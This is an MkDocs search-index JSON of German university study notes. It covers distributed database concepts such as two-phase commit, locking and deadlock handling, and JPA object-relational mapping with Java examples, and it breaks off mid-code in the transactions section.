{
    "docs": [
        {
            "location": "/", 
            "text": "HSR Notizen\n\n\nSpring Semester '17\n\n\n\n\nDatenbanksysteme 2\n\n\nEngineering-Projekt\n\n\nInformationssicherheit 3\n\n\nWirtschaftsinformatik 1 - IT im Business\n\n\nParallele Programmierung\n\n\nPhysik Anwendungen f\u00fcr Informatik\n\n\nSoftware-Engineering 2\n\n\nVerteilte SW-Systeme\n\n\nVolkswirtschaft\n\n\n\n\nLinks\n\n\n\n\nSlack: \nhttps://hsr-students.slack.com\n\n\nMathJax Syntax\n\n\nMkDocs User-Guide\n\n\nMarkdown Cheatsheet", 
            "title": "Home"
        }, 
        {
            "location": "/#hsr-notizen", 
            "text": "", 
            "title": "HSR Notizen"
        }, 
        {
            "location": "/#spring-semester-17", 
            "text": "Datenbanksysteme 2  Engineering-Projekt  Informationssicherheit 3  Wirtschaftsinformatik 1 - IT im Business  Parallele Programmierung  Physik Anwendungen f\u00fcr Informatik  Software-Engineering 2  Verteilte SW-Systeme  Volkswirtschaft", 
            "title": "Spring Semester '17"
        }, 
        {
            "location": "/#links", 
            "text": "Slack:  https://hsr-students.slack.com  MathJax Syntax  MkDocs User-Guide  Markdown Cheatsheet", 
            "title": "Links"
        }, 
        {
            "location": "/playground/", 
            "text": "Markdown Playground\n\n\nDies ist etwas normaler Text mit etwas \nkursiver\n schrift und etwas \nbold\n schrift\n\n\n\n\nDies ist Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text\nzweite Zeile\n\n\n\n\n\n  \npublic\n \nclass\n \nTestClass\n()\n \n{\n\n    \nint\n \nvar\n \n=\n \n1\n;\n\n    \npublic\n \nmethod\n()\n \n{\n\n      \nreturn\n \nvar\n;\n\n    \n}\n\n  \n}\n\n\n\n\n\n\n\n\n\n\n\n\n1\n\n\n2\n\n\n3\n\n\n\n\n\n\n\n\n\n\n1\n\n\netwas\n\n\nanderes\n\n\n\n\n\n\n2\n\n\nals\n\n\nhier\n\n\n\n\n\n\n\n\n\n\nNotiz\n\n\nTest Notiz mit etwas Text drin\n\n\n\n\n\n\nDanger\n\n\nGefahr!\n\n\n\n\n\n\nWarning\n\n\nWarnung!\n\n\n\n\nInline Math: \n x_i^2 * \\frac{(n^2 * n) - 1}{\\Omega} \n\n\n\n\nDisplay Math:\n\n\\sum_{i=0}^n i^2\n\n\n\n\nGruppen mit \n{}\n: \n{10}^5\n\n\n\n\n\n\nA \\rightarrow B \n\n\n\\lim_{x\\to \\infty} \\sin x", 
            "title": "Playground"
        }, 
        {
            "location": "/playground/#markdown-playground", 
            "text": "Dies ist etwas normaler Text mit etwas  kursiver  schrift und etwas  bold  schrift   Dies ist Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text ein Text\nzweite Zeile     public   class   TestClass ()   { \n     int   var   =   1 ; \n     public   method ()   { \n       return   var ; \n     } \n   }      1  2  3      1  etwas  anderes    2  als  hier      Notiz  Test Notiz mit etwas Text drin    Danger  Gefahr!    Warning  Warnung!   Inline Math:   x_i^2 * \\frac{(n^2 * n) - 1}{\\Omega}    Display Math: \\sum_{i=0}^n i^2   Gruppen mit  {} :  {10}^5    A \\rightarrow B   \\lim_{x\\to \\infty} \\sin x", 
            "title": "Markdown Playground"
        }, 
        {
            "location": "/Dbs2/0_Index/", 
            "text": "Datenbanksysteme 2\n\n\n\n\nExam Notes\n\n\nOR-Mapping\n\n\nStored Procedures\n\n\nTriggers\n\n\nViews\n\n\nDatenstrukturen", 
            "title": "0 Index"
        }, 
        {
            "location": "/Dbs2/0_Index/#datenbanksysteme-2", 
            "text": "Exam Notes  OR-Mapping  Stored Procedures  Triggers  Views  Datenstrukturen", 
            "title": "Datenbanksysteme 2"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/", 
            "text": "Verteilte Datenbanksysteme\n\n\nVDBMS\n\n\n\n\nIst ein Datenbanksystem verteilt \u00fcber mehrere physische Knoten\n\n\nIst Transparent gegen aussen, die Verteilung der Daten ist aus Sicht des Benutzers egal\n\n\nIn einem \nhomogenen\n System laufen alle Noten mit der gleichen Software und wissen voneinander, es erscheint gegen\u00fcber dem Benutzer als ein System\n\n\nIn einem \nheterogenen\n System k\u00f6nnen auf den Knoten unterschiedliche Software und Schemas laufen, sie sind voneinander unabh\u00e4ngig, wissen also nichts voneinander. Dies macht das Verteilen von Daten und Transaktionen schwerer.\n\n\n\n\nReplikation\n\n\n\n\nEine Relation (Tabelle) wird redundant auf mehreren Knoten gespeichert\n\n\nDies bietet mehr Verf\u00fcgbarkeit und Parallelit\u00e4t bei Ausf\u00fchrung von Queries\n\n\nHat aber h\u00f6here Update-Kosten und komplexere Synchronisation, \u00c4nderungen k\u00f6nnen zu tempor\u00e4r inkonsistenten Daten f\u00fchren\n\n\n\n\nFragmentierung\n\n\n\n\nJede Relation wird in Fragmente aufgeteilt\n\n\nHorizontale Fragmentierung\n: Jedes \nTupel\n wird auf ein oder mehrere Fragmente aufgeteilt (Sharding). Dies kann z.B. nach einem Attribut der Relation gruppiert werden\n\n\nVertikale Fragmentierung\n: Das Schemea der Relation ist in mehrere kleinere Schematas aufgeteilt. z.B. ist ein Tupel so verteilt auf mehrere Fragmente, die mit einem gemeinsamen Schl\u00fcssel verbunden werden\n\n\n\n\nVerteilte Transaktionen\n\n\n\n\nProblem: Transaktion ist immer lokal zu einer DB-Session\n\n\nIn einem VDBMS muss im Hintergrund die Transaktion aber auf mehreren Nodes committed werden\n\n\n\n\nTwo Phase Commit (2PC)\n\n\n\n\nGarantiert Atomarit\u00e4t von verteilten Transaktionen\n\n\nDie Transaktion zwischen DBMS und Applikation wird von einem \nTransaction Manager\n verwaltet\n\n\nBeim Commit-Befehl der Applikation zum \nTM\n fragt dieser zuerst alle Resourcen (Nodes) an, ob sie bereit zum commit sind (\nprepare to commit\n)\n\n\nFalls alle Resourcen bereit sind, sendet der TM allen den Befehl zum commit\n\n\nWird w\u00e4hrend dem Commit der Commit von einer Resource abgebrochen, oder sie antwortet nicht rechtzeitig, sendet der TM einen Rollback-Befehl an \nalle\n Resourcen\n\n\n\n\nHaben die Resourcen einen Commit abgeschlossen, antworten sie mit einem \nACK\n\n\n\n\n\n\nDer TM stellt so sicher, dass die Transaktion entweder von \nallen\n commited oder von allen rollbacked wird. Er muss auch mit allen Fehlersituationen der Serverkommunikation dazwischen umgehen k\u00f6nnen\n\n\n\n\nDas Protokoll muss auch mit einem Absturz des TM umgehen k\u00f6nnen\n\n\nAlle Schritte werden vom TM und den einzelnen Resource-Managers geloggt. So weiss das System nach einem Absturz, welche Aktionen noch durchgef\u00fchrt werden konnten\n\n\n\n\nResource Manager kann von alleine nicht entscheiden, wenn nach dem \nready\n kein \ncommit\n vom TM kommt. Er muss dann solange blockieren, bis er entweder \ncommit\n oder \nabort\n erh\u00e4lt\n\n\n\n\n\n\n2PC ist kein effizientes Protokoll, es ist relativ langsam und skaliert schlecht\n\n\n\n\nAllerdings wird es von fast allen Herstellern unterst\u00fctzt\n\n\n\n\n2-Phase-Locking\n\n\n\n\nLokale Serialisierbarkeit einer Transaktion reicht bei VDBMS nicht aus, es braucht eine globale Serialisierbarkeit \u00fcber alle Nodes\n\n\nDaf\u00fcr wird 2-Phase-Locking auf verteilte Systeme adaptiert\n\n\n\n\nGlobaler Lock-Manager\n\n\n\n\nVerwaltet Locks auf globaler Ebene \u00fcber alle Nodes hinweg\n\n\nTransaktionen fragen beim Lock-Manager an, um Resourcen zu sperren\n\n\nVorteil: Deadlock-Erkennung ist gleich wie im System mit einem Knoten\n\n\nNachteile: \n\n\nJede Sperr-Anfrage muss zuerst an den Knoten gesendet werden und die Antwort abwarten\n\n\nLock-Manager ist SPOF\n\n\n\n\n\n\n\n\nLokaler Lock-Manager\n\n\n\n\nVerwaltet die Locks auf jedem Node einzeln f\u00fcr sich selbst\n\n\nwird \u00fcber globalen Algorithmus gesteuert\n\n\nVorteil: Arbeit ist verteilt und robuster gegen Ausf\u00e4lle\n\n\nNachteil: Schwierige Deadlock-Erkennung, Performance-Einbussen\n\n\n\n\nTimestamp-based Synchronisation\n\n\n\n\nJede Transaktion bekommt einen Zeitstempel + Rechner-ID, was sie im System global Unique macht\n\n\nDadurch wird die Serialisierungsreihenfolge einer Transaktion festgelegt bei Konfliktoperationen\n\n\nTransaktionen m\u00fcssen alle \u00c4nderungen von \u00e4lteren Zeitstempel sehen, aber keine von j\u00fcngeren\n\n\nEine j\u00fcngere Transaktion darf nicht ein objekt ver\u00e4ndert haben, das anschliessend von der \u00e4lteren geschrieben wird\n\n\nBei Verletzung der Regel wird ein Rollback gemacht\n\n\n\n\nVerteilte Deadlocks\n\n\nErkennung\n\n\n\n\nPrimitive Variante: Bei Timout wird Transaktion zur\u00fcckgesetzt und erneut gestartet\n\n\nProblem beim W\u00e4hlen des Timeouts: Zu lang ist ineffizient, zu kurz gibt \"false-positives\" f\u00fcr Deadlocks\n\n\n\n\n\n\nZentralisierte Erkennung: Stationen melden lokale Wartebeziehung an eine Station, die dann den globalen Wartegraphen aufbaut\n\n\nSichere L\u00f6sung, aber hoher Aufwand\n\n\nRisiko von Phantom-Deadlocks - nicht existierende Deadlocks durch das \"\u00dcberholen\" von Nachrichtne in der \u00dcbertragung\n\n\n\n\n\n\n\n\nVermeidung\n\n\n\n\nOptimistic Concurrency: Nach Abschluss der Transaktion wird Validierung durchgef\u00fchrt\n\n\nTimestamp-based Synchronisation\n\n\n\n\nDistributed Query Processing\n\n\nVerteilte Anfragen\n\n\n\n\nBei einem zentralen System werden die Kosten bestimmt durch Anzahl Disk I/O's\n\n\nIm verteilten System werden sie bestimmt durch Anzahl Netzwerk-I/O's und den Performancegewinn durch Parallelisierung\n\n\nParallelisierung ist z.B. durch horizontale Fragmentierung m\u00f6glich, indem Teilresultate durch Kriterien auf Knoten verteilt sind und anschliessend zusammen gef\u00fchrt werden\n\n\n\n\nJoin-Strategien\n\n\n\n\nShip Whole\n: Alle ben\u00f6tigten Relationen auf einen Knoten \u00fcbertragen, der dann den Join ausf\u00fchrt\n\n\nWenig Nachrichten, hohes Datenvolumen\n\n\n\n\n\n\nFetch as needed\n: Nur Join-Attribute an einen Knoten schicken, der den Join durchf\u00fchrt\n\n\nViele Nachrichten, niedriges Datenvolumen\n\n\n\n\n\n\n\n\nSemi-Join\n\n\n\n\nOptimierung des \nFetch-as-needed\n Ansatz\n\n\nJoin-Attribute der ersten Relation werden zum Knoten der zweiten Relation geschickt\n\n\nKnoten der zweiten Relation schickt alle Tupels, die auf den Join matchen, zur\u00fcck zum Knoten der ersten Relation, wo dann der Join erfolgt", 
            "title": "10 Verteilte DB"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#verteilte-datenbanksysteme", 
            "text": "", 
            "title": "Verteilte Datenbanksysteme"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#vdbms", 
            "text": "Ist ein Datenbanksystem verteilt \u00fcber mehrere physische Knoten  Ist Transparent gegen aussen, die Verteilung der Daten ist aus Sicht des Benutzers egal  In einem  homogenen  System laufen alle Noten mit der gleichen Software und wissen voneinander, es erscheint gegen\u00fcber dem Benutzer als ein System  In einem  heterogenen  System k\u00f6nnen auf den Knoten unterschiedliche Software und Schemas laufen, sie sind voneinander unabh\u00e4ngig, wissen also nichts voneinander. Dies macht das Verteilen von Daten und Transaktionen schwerer.", 
            "title": "VDBMS"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#replikation", 
            "text": "Eine Relation (Tabelle) wird redundant auf mehreren Knoten gespeichert  Dies bietet mehr Verf\u00fcgbarkeit und Parallelit\u00e4t bei Ausf\u00fchrung von Queries  Hat aber h\u00f6here Update-Kosten und komplexere Synchronisation, \u00c4nderungen k\u00f6nnen zu tempor\u00e4r inkonsistenten Daten f\u00fchren", 
            "title": "Replikation"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#fragmentierung", 
            "text": "Jede Relation wird in Fragmente aufgeteilt  Horizontale Fragmentierung : Jedes  Tupel  wird auf ein oder mehrere Fragmente aufgeteilt (Sharding). Dies kann z.B. nach einem Attribut der Relation gruppiert werden  Vertikale Fragmentierung : Das Schemea der Relation ist in mehrere kleinere Schematas aufgeteilt. z.B. ist ein Tupel so verteilt auf mehrere Fragmente, die mit einem gemeinsamen Schl\u00fcssel verbunden werden", 
            "title": "Fragmentierung"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#verteilte-transaktionen", 
            "text": "Problem: Transaktion ist immer lokal zu einer DB-Session  In einem VDBMS muss im Hintergrund die Transaktion aber auf mehreren Nodes committed werden", 
            "title": "Verteilte Transaktionen"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#two-phase-commit-2pc", 
            "text": "Garantiert Atomarit\u00e4t von verteilten Transaktionen  Die Transaktion zwischen DBMS und Applikation wird von einem  Transaction Manager  verwaltet  Beim Commit-Befehl der Applikation zum  TM  fragt dieser zuerst alle Resourcen (Nodes) an, ob sie bereit zum commit sind ( prepare to commit )  Falls alle Resourcen bereit sind, sendet der TM allen den Befehl zum commit  Wird w\u00e4hrend dem Commit der Commit von einer Resource abgebrochen, oder sie antwortet nicht rechtzeitig, sendet der TM einen Rollback-Befehl an  alle  Resourcen   Haben die Resourcen einen Commit abgeschlossen, antworten sie mit einem  ACK    Der TM stellt so sicher, dass die Transaktion entweder von  allen  commited oder von allen rollbacked wird. Er muss auch mit allen Fehlersituationen der Serverkommunikation dazwischen umgehen k\u00f6nnen   Das Protokoll muss auch mit einem Absturz des TM umgehen k\u00f6nnen  Alle Schritte werden vom TM und den einzelnen Resource-Managers geloggt. So weiss das System nach einem Absturz, welche Aktionen noch durchgef\u00fchrt werden konnten   Resource Manager kann von alleine nicht entscheiden, wenn nach dem  ready  kein  commit  vom TM kommt. Er muss dann solange blockieren, bis er entweder  commit  oder  abort  erh\u00e4lt    2PC ist kein effizientes Protokoll, es ist relativ langsam und skaliert schlecht   Allerdings wird es von fast allen Herstellern unterst\u00fctzt", 
            "title": "Two Phase Commit (2PC)"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#2-phase-locking", 
            "text": "Lokale Serialisierbarkeit einer Transaktion reicht bei VDBMS nicht aus, es braucht eine globale Serialisierbarkeit \u00fcber alle Nodes  Daf\u00fcr wird 2-Phase-Locking auf verteilte Systeme adaptiert", 
            "title": "2-Phase-Locking"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#globaler-lock-manager", 
            "text": "Verwaltet Locks auf globaler Ebene \u00fcber alle Nodes hinweg  Transaktionen fragen beim Lock-Manager an, um Resourcen zu sperren  Vorteil: Deadlock-Erkennung ist gleich wie im System mit einem Knoten  Nachteile:   Jede Sperr-Anfrage muss zuerst an den Knoten gesendet werden und die Antwort abwarten  Lock-Manager ist SPOF", 
            "title": "Globaler Lock-Manager"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#lokaler-lock-manager", 
            "text": "Verwaltet die Locks auf jedem Node einzeln f\u00fcr sich selbst  wird \u00fcber globalen Algorithmus gesteuert  Vorteil: Arbeit ist verteilt und robuster gegen Ausf\u00e4lle  Nachteil: Schwierige Deadlock-Erkennung, Performance-Einbussen", 
            "title": "Lokaler Lock-Manager"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#timestamp-based-synchronisation", 
            "text": "Jede Transaktion bekommt einen Zeitstempel + Rechner-ID, was sie im System global Unique macht  Dadurch wird die Serialisierungsreihenfolge einer Transaktion festgelegt bei Konfliktoperationen  Transaktionen m\u00fcssen alle \u00c4nderungen von \u00e4lteren Zeitstempel sehen, aber keine von j\u00fcngeren  Eine j\u00fcngere Transaktion darf nicht ein objekt ver\u00e4ndert haben, das anschliessend von der \u00e4lteren geschrieben wird  Bei Verletzung der Regel wird ein Rollback gemacht", 
            "title": "Timestamp-based Synchronisation"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#verteilte-deadlocks", 
            "text": "", 
            "title": "Verteilte Deadlocks"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#erkennung", 
            "text": "Primitive Variante: Bei Timout wird Transaktion zur\u00fcckgesetzt und erneut gestartet  Problem beim W\u00e4hlen des Timeouts: Zu lang ist ineffizient, zu kurz gibt \"false-positives\" f\u00fcr Deadlocks    Zentralisierte Erkennung: Stationen melden lokale Wartebeziehung an eine Station, die dann den globalen Wartegraphen aufbaut  Sichere L\u00f6sung, aber hoher Aufwand  Risiko von Phantom-Deadlocks - nicht existierende Deadlocks durch das \"\u00dcberholen\" von Nachrichtne in der \u00dcbertragung", 
            "title": "Erkennung"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#vermeidung", 
            "text": "Optimistic Concurrency: Nach Abschluss der Transaktion wird Validierung durchgef\u00fchrt  Timestamp-based Synchronisation", 
            "title": "Vermeidung"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#distributed-query-processing", 
            "text": "", 
            "title": "Distributed Query Processing"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#verteilte-anfragen", 
            "text": "Bei einem zentralen System werden die Kosten bestimmt durch Anzahl Disk I/O's  Im verteilten System werden sie bestimmt durch Anzahl Netzwerk-I/O's und den Performancegewinn durch Parallelisierung  Parallelisierung ist z.B. durch horizontale Fragmentierung m\u00f6glich, indem Teilresultate durch Kriterien auf Knoten verteilt sind und anschliessend zusammen gef\u00fchrt werden", 
            "title": "Verteilte Anfragen"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#join-strategien", 
            "text": "Ship Whole : Alle ben\u00f6tigten Relationen auf einen Knoten \u00fcbertragen, der dann den Join ausf\u00fchrt  Wenig Nachrichten, hohes Datenvolumen    Fetch as needed : Nur Join-Attribute an einen Knoten schicken, der den Join durchf\u00fchrt  Viele Nachrichten, niedriges Datenvolumen", 
            "title": "Join-Strategien"
        }, 
        {
            "location": "/Dbs2/10_Verteilte_DB/#semi-join", 
            "text": "Optimierung des  Fetch-as-needed  Ansatz  Join-Attribute der ersten Relation werden zum Knoten der zweiten Relation geschickt  Knoten der zweiten Relation schickt alle Tupels, die auf den Join matchen, zur\u00fcck zum Knoten der ersten Relation, wo dann der Join erfolgt", 
            "title": "Semi-Join"
        }, 
        {
            "location": "/Dbs2/1_Exam/", 
            "text": "Some exam notes...", 
            "title": "1 Exam"
        }, 
        {
            "location": "/Dbs2/2_OR-Mapping/", 
            "text": "OR Mapping\n\n\nZiel: Gap zwischen Objektmodell der Applikation und (meist) relationales Modell der Datenbanken \u00fcberwinden\n\n\nJava Persistence API (JPA)\n\n\n\n\nJPA ist ein Layer zwischen JDBC und dem Programm\n\n\nJPA ist nur eine Definition, implementiert von Providern\n\n\nHier wird die EclipseLink-Implementierung verwendet (Hibernate w\u00e4re ein anderer Provider)\n\n\n\n\nEntities\n\n\n\n\nEntities sind POJO's mit ID-Feld f\u00fcr PK mit default-Konstruktor\n\n\nD\u00fcrfen nicht final sein (wegen z.B. lazy-loading)\n\n\nAbbildung in DB \u00fcber Annotations oder sepparates XML-File\n\n\nAnnotation \n@Entity\n f\u00fcr Klasse, \n@Id\n f\u00fcr PK-Feld\n\n\n\n\nBeispiel\n\n\n@Entity\n\n\npublic\n \nclass\n \nBankCustomer\n \n{\n\n    \n@Id\n\n    \nprivate\n \nlong\n \nid\n;\n\n\n    \npublic\n \nlong\n \ngetId\n()\n \n{\n\n        \nreturn\n \nid\n;\n\n    \n}\n\n    \nprivate\n \nString\n \nname\n;\n\n    \npublic\n \nString\n \ngetName\n()\n \n{\n\n        \nreturn\n \nname\n;\n\n    \n}\n\n    \npublic\n \nvoid\n \nsetName\n(\nString\n \nname\n)\n \n{\n\n        \nthis\n.\nname\n \n=\n \nname\n;\n\n    \n}\n\n\n}\n\n\n\n\n\n\npersistence.xml\n\n\npersistence\n \nxmlns:xsi=\nhttp://www.w3.org/2001/XMLSchema-instance\n\n    \nxsi:schemaLocation=\nhttp://java.sun.com/xml/ns/persistence\n\n\n        http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd\n\n    \nversion=\n2.0\n \nxmlns=\nhttp://java.sun.com/xml/ns/persistence\n\n\npersistence-unit\n \nname=\nBank\n \ntransaction-type=\nRESOURCE_LOCAL\n\n    \nprovider\norg.eclipse.persistence.jpa.PersistenceProvider\n/provider\n\n    \nexclude-unlisted-classes\nfalse\n/exclude-unlisted-classes\n\n        \nproperties\n\n            \nproperty\n \nname=\njavax.persistence.jdbc.driver\n\n                \nvalue=\norg.postgresql.Driver\n/\n\n            \nproperty\n \nname=\njavax.persistence.jdbc.url\n\n                \nvalue=\njdbc:postgresql:jpatest\n/\n\n            \nproperty\n \nname=\njavax.persistence.jdbc.user\n \nvalue=\ntest\n/\n\n            \nproperty\n \nname=\njavax.persistence.jdbc.password\n \nvalue=\ntest\n/\n\n            \nproperty\n \nname=\neclipselink.target-database\n \nvalue=\nPostgreSQL\n/\n\n        \n/properties\n\n    \n/persistence-unit\n\n\n/persistence\n\n\n\n\n\n\nEntities CRUD\n\n\n// SELECT\n\n\nEntityManagerFactory\n \nfactory\n \n=\n\n    \nPersistence\n.\ncreateEntityManagerFactory\n(\nBank\n);\n\n\nEntityManager\n \nem\n \n=\n \nfactory\n.\ncreateEntityManager\n();\n\n\nQuery\n \nquery\n \n=\n \nem\n.\ncreateQuery\n(\nSELECT a FROM BankAccount a\n);\n\n\nList\nBankAccount\n \nlist\n \n=\n \nquery\n.\ngetResultList\n();\n\n\nfor\n \n(\nBankAccount\n \naccount\n \n:\n \nlist\n)\n \n{\n\n    \nSystem\n.\nout\n.\nprintln\n(\naccount\n);\n\n\n}\n\n\nem\n.\nclose\n();\n \n// besser mit try-with-ressources\n\n\n\n// INSERT\n\n\nem\n.\ngetTransaction\n().\nbegin\n();\n\n\nBankCustomer\n \ncustomer\n \n=\n \nnew\n \nBankCustomer\n();\n\n\ncustomer\n.\nsetName\n(\nBill\n);\n\n\nem\n.\npersist\n(\ncustomer\n);\n \n// INSERT and SELECT, customer hat jetzt seine ID\n\n\nem\n.\ngetTransaction\n().\ncommit\n();\n\n\nem\n.\nclose\n();\n\n\n\n// UPDATE\n\n\nem\n.\ngetTransaction\n().\nbegin\n();\n\n\nBankAccount\n \naccount\n \n=\n \nem\n.\nfind\n(\nBankAccount\n.\nclass\n,\n \n1L\n);\n\n\naccount\n.\nincBalance\n(\n100\n);\n\n\nem\n.\ngetTransaction\n().\ncommit\n();\n\n\n\n// DELETE\n\n\n// nicht effizient, Java-Object wird erst durch GC aufger\u00e4umt\n\n\nem\n.\ngetTransaction\n().\nbegin\n();\n\n\nBankAccount\n \naccount\n \n=\n \nem\n.\nfind\n(\nBankAccount\n.\nclass\n,\n \n1L\n);\n\n\nem\n.\nremove\n(\naccount\n);\n\n\nem\n.\ngetTransaction\n().\ncommit\n();\n\n\n\n\n\n\nTable Mapping\n\n\n@Entity\n\n\n@Table\n(\nname\n \n=\n \naccount\n)\n\n\npublic\n \nclass\n \nBankAccount\n \n{\n\n    \n@Id\n\n    \n@Column\n(\nname\n \n=\n \naccountid\n)\n\n    \nprivate\n \nlong\n \nid\n;\n\n\n    \nprivate\n \ndouble\n \nbalance\n;\n \n// 1:1 Mapping\n\n\n    \n@Column\n(\nname\n \n=\n \ndescription\n)\n\n    \nprivate\n \nString\n \nexplanation\n;\n\n\n    \n@Column\n(\nname\n=\n\u201c\nssn\n\u201c\n,\n \nunique\n=\ntrue\n,\n \nnullable\n=\ntrue\n)\n\n    \nprivate\n \nlong\n \nssn\n;\n\n\n    \n@Column\n(\nname\n=\n\u201c\nl_name\n\u201c\n,\n \nlength\n=\n200\n)\n\n    \nprivate\n \nString\n \nlastName\n;\n\n\n    \n//Zusatzinfo, wird als TIMESTAMP abgelegt\n\n    \n@Temporal\n(\nTemporalType\n.\nTIMESTAMP\n)\n \n    \nprivate\n \nCalendar\n \ncreationDate\n;\n\n\n    \n@Transient\n \n// wird nicht gemapped\n\n    \nprivate\n \nString\n \ntempComments\n;\n\n    \n// getter und setter\n\n\n}\n\n\n\n\n\n\n\n\nWeitere Attribute: \nscale\n, \nprecision\n\n\n\n\nRelationen\n\n\n// 1:1 Mapping\n\n\n@Entity\n\n\n@Table\n(\nname\n \n=\n \nbankcustomer\n)\n\n\npublic\n \nclass\n \nBankCustomer\n \n{\n\n    \n@OneToOne\n(\noptional\n \n=\n \ntrue\n)\n\n    \n@JoinColumn\n(\nname\n \n=\n \naddressref\n)\n\n    \nprivate\n \nAddress\n \naddress\n;\n\n    \n// ...\n\n\n}\n\n\n\n// Bidirectional 1:1 mapping, Datenbank bleibt gleich\n\n\n@Entity\n\n\npublic\n \nclass\n \nAddress\n \n{\n\n    \n@OneToOne\n(\nmappedBy\n \n=\n \naddress\n)\n\n    \nprivate\n \nBankCustomer\n \ncustomer\n;\n\n    \n// ...\n\n\n}\n\n\n\n// N:1 Mapping\n\n\nclass\n \nBankAccount\n \n{\n\n    \n@ManyToOne\n(\noptional\n \n=\n \nfalse\n)\n\n    \n@JoinColumn\n(\nname\n \n=\n \ncustomerref\n)\n\n    \nprivate\n \nBankCustomer\n \ncustomer\n;\n\n    \n//...\n\n\n}\n\n\n\n// Bidirectional N:1 \n\n\nclass\n \nBankCustomer\n \n{\n\n    \n@OneToMany\n(\nmappedBy\n \n=\n \ncustomer\n)\n\n    \nprivate\n \nCollection\nBankAccount\n \naccounts\n;\n \n// = ...\n\n    \n// ...\n\n\n}\n\n\n// N:M maping\n\n\nclass\n \nBankManager\n \n{\n\n    \n@ManyToMany\n\n    \n@JoinTable\n(\nname\n \n=\n \ncustomer_manager\n,\n\n        \njoinColumns\n \n=\n \n{\n@JoinColumn\n(\nname\n \n=\n \nmanagerref\n)},\n\n        \ninverseJoinColumns\n \n=\n \n{\n@JoinColumn\n(\nname\n \n=\n \ncustomerref\n)})\n\n    \nprivate\n \nCollection\nBankCustomer\n \ncustomers\n;\n \n// = ...\n\n\n}\n\n\n\n\n\n\n\n\nBei bidirektionalen Beziehungen m\u00fcssen beide Seiten manuell gesetzt werden (im Gegensatz zu z.B. EF)\n\n\nIm Beispiel muss beim Hinzuf\u00fcgen eines \nBankAccount\n dieser der Liste in der \nBankCustomer\n hinzugef\u00fcgt werden\n\n\n\n\n\n\nLazy-Loading ist per default aktiviert f\u00fcr 1:n und n:m\n\n\nBsp: Wenn \nBankCustomer\n geladen werden, wird die \nBankAccounts\n-Liste lazy mit \ncustomer.getAccounts()\n geladen\n\n\n\n\n\n\nEager-Loading standard bei 1:1 und n:1\n\n\nExplizit angeben mit z.B. \n@ManyToMany(fetch = FetchType.EAGER)\n\n\n\n\nPersistence-Context\n\n\n\n\nEin Objekt ist neu erstellt erstmal \nunmanaged\n\n\nWird es in die DB eingef\u00fcgt mit \npersist()\n, ist es \nmanaged\n und somit im Persistence-Context (Objekt hat eine Id)\n\n\nWird die Verbindung geschlossen (\nclose()\n) oder removed, sind die Objekte wieder \nunmanaged\n\n\nPersistence-Kontext verwaltet einen Cache - Bei mehrmaliger Abfrage der gleichen Objekte werden sie aus dem Cache geladen\n\n\nWichtig, sonst k\u00f6nnte es mehrere Java-Instanzen f\u00fcr ein DB-Objekt geben \n\n\nSo gibt es in einem Kontext f\u00fcr ein DB-Objekt genau eine Java Instanz  (Identity Map Pattern)\n\n\n\n\n\n\n\n\n\n\nGe\u00e4nderte Werte im Persistence-Kontext werden beim Transaction-Commit auf der DB gespeichert (Unit of Work Pattern)\n\n\n\n\nEntityManager\n \nem\n \n=\n \nemf\n.\ncreateEntityManager\n();\n\n\nBankCustomer\n \nc1\n \n=\n \nem\n.\nfind\n(\nBankCustomer\n.\nclass\n,\n \n1L\n);\n\n\nBankCustomer\n \nc2\n \n=\n \nem\n.\nfind\n(\nBankCustomer\n.\nclass\n,\n \n1L\n);\n\n\nassert\n(\nc1\n \n==\n \nc2\n);\n \n// gleicher PC\n\n\nEntityManager\n \nem1\n \n=\n \nemf\n.\ncreateEntityManager\n();\n\n\nc2\n \n=\n \nem1\n.\nfind\n(\nBankCustomer\n.\nclass\n,\n \n1L\n);\n\n\nassert\n(\nc1\n \n!=\n \nc2\n);\n \n// unterschiedlicher PC\n\n\n\n\n\n\nEntity Identit\u00e4t\n\n\n\n\nAnnotation \n@Id\n\n\n@GeneratedValue\n - generierte ID mit 4 M\u00f6glichkeiten\n\n\n\n\nTyp Identity\n\n\n@Id\n\n\n@GeneratedValue\n(\nstrategy\n \n=\n \nGenerationType\n.\nIDENTITY\n)\n\n\nprivate\n \nlong\n \naccountId\n;\n\n\n\n\n\n\n\n\nWird abgebildet in \nSERIAL\n\n\n\n\nTyp Sequence\n\n\nId\n\n\n@GeneratedValue\n(\nstrategy\n \n=\n \nGenerationType\n.\nSEQUENCE\n,\n\n    \ngenerator\n \n=\n \nBankCustGen\n)\n\n\n@SequenceGenerator\n(\nname\n \n=\n \nBankCustGen\n,\n\n    \nsequenceName\n \n=\n \nCustomerIdSeq\n,\n\n    \nallocationSize\n=\n1\n)\n\n\nprivate\n \nlong\n \ncustomerId\n;\n\n\n\n\n\n\n\n\nNote\n\n\ntodo\n\n\n\n\nTransitive Persistenz\n\n\n\n\nVon Persistente Objekte erreichbaren Objekte sollten auch persistent sein\n\n\n\n\nInkonsistente Bidirektionalit\u00e4t\n\n\n\n\nIn JPA werden bidirektionale Relationen nicht in beide Richtungen automatisch gesetzt\n\n\nMuss von Hand gemacht werden\n\n\n\n\nTransaktionen\n\n\nEntityManager\n \nem\n \n=\n \nfactory\n.\ncreateEntityManager\n();\n\n\nem\n.\ngetTransaction\n().\nbegin\n();\n\n\n// ...\n\n\n// do something... make 